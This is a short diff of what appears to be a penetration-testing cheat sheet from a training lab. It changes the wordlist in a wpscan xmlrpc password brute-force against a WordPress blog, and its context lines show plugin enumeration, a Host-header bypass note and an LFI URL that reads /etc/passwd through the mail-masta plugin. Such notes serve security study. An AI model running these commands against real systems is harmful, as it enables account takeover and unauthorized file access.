@@ -232,7 +232,7 @@ to pypass host unauthorized >> Host: localhost
 gem install ruby-devel wpscan
 wpscan –url http://IP/ –enumerate p -e vt,vp
 brute forcing xmlrpc users and password 
-wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P rockyou.txt --url http://blog.inlanefreight.com
 WORDPRESS LFI
 http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 
